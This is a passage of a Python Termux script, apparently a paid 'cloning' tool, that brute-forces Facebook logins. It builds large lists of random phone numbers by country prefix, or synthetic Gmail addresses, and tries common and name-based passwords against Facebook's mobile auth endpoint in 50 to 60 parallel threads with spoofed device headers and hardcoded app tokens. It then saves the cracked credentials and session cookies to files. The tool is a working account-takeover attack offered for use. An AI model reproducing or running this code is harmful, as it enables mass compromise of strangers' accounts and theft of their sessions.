      input(f'{G} IF YOU WANT TO BUY THEN PRESS ENTER ')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+213781382589?text='+tks),approval()
      sys.exit()
      time.sleep(1)
      approval()
  except Exception as error:
    print(error)
#####_____Main-Menu_____#####
def menu():
        try:
                approval()
                #clear()
                x = ("***")
                if x == ("***"):
                        print(' [1] File Cloning ')
                        print(' [2] Random Cloning')
                        print(' [3] Create File')
                        print(' [4] Working Password List')
                        print(' [5] Auto 2 Factor Single Id')
                        print(' [6] Auto 2 Factor Bulk File')
                        print(' [7] Join YouTube channel')
                        print(' [0] EXIT ')
                        line()
                        xd=input(' CHOOSE AN OPTION: ')
                        if xd in ['1','01']:
                                clear()
                                
                                print(' PUT FILE EXAMPLE :  \033[1;32m/sdcard/ZOOLDIK.txt..')
                                line()
                                file = input(' PUT FILE PATH\033[1;37m: ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(' FILE LOCATION NOT FOUND ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print(f"{W} [1] METHOD {G}(NEW)")
                                print(f"{W} [2] METHOD {G}(NEW)")
                                print(f"{W} [3] METHOD {G}(MIX)")
                                line()
                                mthd=input(' CHOOSE : ')
                                line()
                                clear()
                                plist = []
                                try:
                                        ps_limit = int(input(' HOW MANY PASSWORDS DO YOU WANT TO ADD ? '))
                                except:
                                        ps_limit =1
                                line()
                                clear()
                                print('\033[1;32m EXAMPLE : first last,firtslast,first123')
                                line()
                                for i in range(ps_limit):
                                        plist.append(input(f' PUT PASSWORD {i+1}: '))
                                line()
                                clear()
                                with tred(max_workers=50) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        print(f"{G} DATE : {W}{ha}/{bu}/{ta} ")
                                        print(f"{G} TIME : {W}"+str(a)+":"+str(lt()[4])+" "+ tag+"")
                                        print(f"{W} TOTAL ACCOUNT : {G}"+total_ids+f" ")
                                        print(f"{W} Use Flight  Mode For Speed  Up")
                                        line()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(ffb,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(api,ids,names,passlist)
                                                elif mthd in ['3','03']:
                                                        crack_submit.submit(api1,ids,names,passlist)
                                line()
                                print(' THE PROCESS HAS COMPLETED')
                                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                                line()
                                input(' PRESS ENTER TO BACK ')
                                menu()
                        elif xd in ['2','02']:
                                clear()
                                print(' [1] msila cloning\n [2] Bangladesh cloning\n [3] Afghanistan cloning\n [4] India cloning\n [5] Gmail cloning\n [0] Back menu')
                                line()
                                x=input(' Choose: ')
                                if x in ['1','01']:
                                        pak()
                                elif x in ['2','02']:
                                        bd()
                                elif x in ['3','03']:
                                        afg()
                                elif x in ['4','04']:
                                        ind()        
                                elif x in ['5','05']:  
                                        gmail()      
                                else:
                                        menu()
                        elif xd in ['3','03']:
                        	create()
                        elif xd in ['4','04']:
                        	Passlist()
                        elif xd in ['5','05']:
                        	Auto2F()
                        elif xd in ['6','06']:
                        	os.system('python 2F.py')
                        elif xd in ['7','07']:
                        	os.system('xdg-open https://youtube.com/@ANISMRXdOfficialGroup?si=20VvXhZcsAT7qXmP')
                        	menu()
                        elif xd in ['0','00']:
                        	exit(f"{G} THANKS FOR USING ANISMRX TOOL")
                        
        except requests.exceptions.ConnectionError:
                print('\n NO INTERNET CONNECTION ...')
                exit()
def pak():
                user=[]
                clear()
                print('\033[1;32m CODE EXAMPLE : 0306,0315,0335,0345')
                code = input('\033[1;37m PUT CODE: ')
                clear()
                try:
                        limit = int(input('\033[1;32m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=60) as TRT:     
                        clear()
                        tl = str(len(user))
                        print(' [+] Total accounts: \033[1;97m'+tl)
                        print(' [+] Select code: \033[1;97m '+code)
                        print(' [+] Cloning has been started \033[1;97m')
                        line()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','malik123','kingkhan','ZOOLDIK123','pak123','khan123']
                                TRT.submit(rndm,ids,passlist)
                line()
                print(' THE PROCESS HAS COMPLETED')
                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                line()
                input(' PRESS ENTER TO BACK ')
                menu()
def bd():
                user=[]
                clear()
                print('\033[1;31m CODE EXAMPLE : 017,016,018')
                code = input('\033[1;37m PUT CODE: ')
                clear()
                try:
                        limit = int(input('\033[1;31m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=60) as TRT:     
                        clear()
                        tl = str(len(user))
                        print(' [+] Total accounts: \033[1;97m'+tl)
                        print(' [+] Select code: \033[1;97m '+code)
                        print(' [+] Cloning has been started \033[1;97m')
                        line()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'i love you','iloveyou','free fire','freefire','57273200']
                                TRT.submit(rndm,ids,passlist)
                line()
                print(' THE PROCESS HAS COMPLETED')
                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                line()
                input(' PRESS ENTER TO BACK ')
                menu()

def afg():
                user=[]
                clear()
                print('\033[1;31m CODE EXAMPLE : 9377,9379,9374')
                code = input('\033[1;37m PUT CODE: ')
                clear()
                try:
                        limit = int(input('\033[1;31m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=60) as TRT:     
                        clear()
                        tl = str(len(user))
                        print(' [+] Total accounts: \033[1;97m'+tl)
                        print(' [+] Select code: \033[1;97m '+code)
                        print(' [+] Cloning has been started \033[1;97m')
                        line()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
                                TRT.submit(rndm,ids,passlist)
                line()
                print(' THE PROCESS HAS COMPLETED')
                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                line()
                input(' PRESS ENTER TO BACK ')
                menu()
def ind():
                user=[]
                clear()
                print('\033[1;31m CODE EXAMPLE : 91***,etc')
                code = input('\033[1;37m PUT CODE: ')
                clear()
                try:
                        limit = int(input('\033[1;31m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=60) as TRT:     
                        clear()
                        tl = str(len(user))
                        print(' [+] Total accounts: \033[1;97m'+tl)
                        print(' [+] Select code: \033[1;97m '+code)
                        print(' [+] Cloning has been started \033[1;97m')
                        line()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'57273200','hindustan','kingkhan','india123','59039200','57575751']
                                TRT.submit(rndm,ids,passlist)
                line()
                print(' THE PROCESS HAS COMPLETED')
                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                line()
                input(' PRESS ENTER TO BACK ')
                menu()
                
def gmail():
                os.system('rm -rf .re.txt')
                clear()
                print('\033[1;37m example: muhammad, ali, sajjad, faizan\033[1;97m')
                line()
                first = input(' Put first name: ')
                line()
                print('\033[1;37m example: khan, ahmad, ali \033[1;97m')
                line()
                last = input(' Put last name: ')
                line()
                print(' Example: @gmail.com , @yahoo.com etc...')
                line()
                domain = input(' domain: ')
                line()
                try:
                        limit=int(input(' Put limit: '))
                except ValueError:
                        limit = 5000
                line()
                print(' Getting gmails...')
                lists = ['3','4']
                for xd in range(limit):
                        lchoice = random.choice(lists)
                        if '3' in lchoice:
                                mail = ''.join(random.choice(string.digits) for _ in range(3))
                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        else:
                                mail = ''.join(random.choice(string.digits) for _ in range(4))
                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        fo = open('.re.txt', 'r').read().splitlines()
                with tred(max_workers=60) as ZAIN:
                        total = str(len(fo))
                        clear()
                        print(' Total account : \033[1;32m'+total)
                        print("\033[1;31m If No Result Use Flight Mode\033[1;37m")
                        line()
                        for user in fo:
                                ids,names = user.split('|')
                                first_name = names.rsplit(' ')[0]
                                try:
                                        last_name = names.rsplit(' ')[1]
                                except IndexError:
                                        last_name = 'Khan'
                                fs = first_name.lower()
                                ls = last_name.lower()
                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
                                ZAIN.submit(rndm,ids,passlist)
                print('\033[1;37m')
                line()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                line()
                input(' Press enter to back ')
                menu()

             
#####_____Method-1_____#####
def ffb(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [ZOOLDIK-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        data = {'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'cpl': 'true','family_device_id': str(uuid.uuid4()),'credentials_type': 'device_based_login_password','error_detail_type': 'button_with_disabled','source': 'register_api','email': ids,'password': pas,'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32','generate_session_cookies': '1','meta_inf_fbmeta': 'NO_FILE','advertiser_id': str(uuid.uuid4()),'currently_logged_in_userid': '0','locale': 'en_PK','client_country_code': 'PK','method': 'auth.login','fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler','api_key': '882a8490361da98702bf97a021ddc14d'}
                        headers = {'User-Agent': M1(),'Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'X-FB-Connection-Type': 'MOBILE.LTE','Authorization':'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895','X-FB-Connection-Quality': 'MOBILE.LTE','X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000)),'X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                        	print('\r\r\033[1;32m [MRX-OK] '+ids+' | '+pas+'\033[1;97m')
                        	ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                        	ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                        	cookies = f"sb={ssbb};{ckkk}"
                        	print(ua)
                        	open('/sdcard/ANISMRX/ANISMRX-M1-COOKIE.txt','a').write(ids+'|'+pas+ '|' +cookies+'\n')
                        	open('/sdcard/ANISMRX/ANISMRX-M1-OK.txt','a').write(ids+'|'+pas+'\n')
                        	oks.append(ids)
                        	break
                        else:
                        	continue
                loop+=1
        except requests.exceptions.ConnectionError:
       	     time.sleep(60)
        except Exception as e:
                pass
#####_____Method-2_____#####
def api(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [ANIS-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        data = {'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'cpl': 'true','family_device_id': str(uuid.uuid4()),'credentials_type': 'device_based_login_password','error_detail_type': 'button_with_disabled','source': 'register_api','email': ids,'password': pas,'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32','generate_session_cookies': '1','meta_inf_fbmeta': 'NO_FILE','advertiser_id': str(uuid.uuid4()),'currently_logged_in_userid': '0','locale': 'en_GB','client_country_code': 'GB','method': 'auth.login','fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler','api_key': '882a8490361da98702bf97a021ddc14d'}
                        headers = {'User-Agent': M2(),'Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'X-FB-Connection-Type': 'MOBILE.LTE','Authorization':'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895','X-FB-Connection-Quality': 'MOBILE.LTE','X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000)),'X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [ANISMRX-OK] '+ids+' | '+pas+'\033[1;97m')
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                        cookies = f"sb={ssbb};{ckkk}"
                                        #print('\033[1;37m [Cookies] :- '+cookies)
                                        open('/sdcard/ANISMRX/ANISMRX-M2-COOKIE.txt','a').write(ids+'|'+pas+ '|' +cookies+'\n')
                                        open('/sdcard/ANISMRX/ANISMRX-M2-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(60)
        except Exception as e:
                pass
#####_____Method-3_____#####
def api1(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [ZOOLDIK-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        data = {'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'cpl': 'true','family_device_id': str(uuid.uuid4()),'credentials_type': 'device_based_login_password','error_detail_type': 'button_with_disabled','source': 'register_api','email': ids,'password': pas,'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32','generate_session_cookies': '1','meta_inf_fbmeta': 'NO_FILE','advertiser_id': str(uuid.uuid4()),'currently_logged_in_userid': '0','locale': 'en_US','client_country_code': 'US','method': 'auth.login','fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler','api_key': '882a8490361da98702bf97a021ddc14d'}
                        headers = {'User-Agent': M3(),'Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'X-FB-Connection-Type': 'MOBILE.LTE','Authorization':'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895','X-FB-Connection-Quality': 'MOBILE.LTE','X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000)),'X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [ANISMRX-OK] '+ids+' | '+pas+'\033[1;97m')
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                        cookies = f"sb={ssbb};{ckkk}"
                                        #print('\033[1;37m [Cookies] :- '+cookies)
                                        open('/sdcard/ANISMRX/ANISMRX-M3-COOKIE.txt','a').write(ids+'|'+pas+ '|' +cookies+'\n')
                                        open('/sdcard/ANISMRX/ANISMRX-M3-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(60)
        except Exception as e:
                pass
#####_____Random_____#####
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [ANISMRX-RND] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        data = {'adid': str(uuid.uuid4()),
'format': 'json',
'device_id': str(uuid.uuid4()),
'email': ids,
'password': pas,
'generate_analytics_claims': '1',
'community_id': '',
'cpl': 'true',
'try_num': '1', 
'family_device_id': str(uuid.uuid4()),
'credentials_type': 'password',
'source': 'login',
'error_detail_type': 'button_with_disabled',
'enroll_misauth': 'false',
'generate_session_cookies': '1',
'generate_machine_id': '1',
'currently_logged_in_userid': '0',
'locale': 'en_US',
'client_country_code': 'US',
'fb_api_req_friendly_name': 'authenticate',
'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
                        headers = {'User-Agent': '[FBAN/FB4A;FBAV/405.0.0.35.41;FBBV/36467143;FBDM/{density=1.5,width=1080,height=1440};FBLC/en_GB;FBRV/606314049;FBCR/MTN-CG;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-I745B;FBSV/2.3.9;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
'Accept-Encoding': 'gzip, deflate',
'Connection': 'close',
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(2e4, 4e4)),
'X-FB-SIM-HNI': str(random.randint(2e4, 4e4)),
'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'X-FB-Connection-Type': 'WIFI',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'your account was locked' in po:
                                pass
                        elif 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[1;32m [ANISMRX-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/ZOOLDIK/ANISMRX-RND-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/ZOOLDIK/ANISMRX-RND-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                    #    print('\r\r\x1b[1;31m [ZOOLDIK-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ZOOLDIK/ANISMRX-RND-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(20)        
        except Exception as e:
                pass
#####_____Working-Password-List_____#####
def Passlist():
	clear()
	print(f'{G} Working Password For ANISMRX')
	line()
	print(' [1] first last')
	print(' [2] firstlast')
	print(' [3] first123')
	print(' [4] first12345')
	print(' [5] last123')
	print(' [6] last12345')
	print(' [7] firstlast123')
	print(' [8] firstlast12345')
	line()
	print(f'{G} Working Password For Nepal')
	line()
	print(' [1] first last')
	print(' [2] firstlast')
	print(' [3] first@123')
	print(' [4] firstlast123')
	print(' [5] first1234')
	print(' [6] first12')
	print(' [7] first12345')
	line()
	print(f'{G} Working Password For India')
	line()
	print(' [1] first last')
	print(' [2] first@1234')
	print(' [3] first123')
	print(' [4] last123')
	print(' [5] first12345')
	print(' [6] last12345')
	print(' [7] first1234')
	print(' [8] first12')
	print(' [
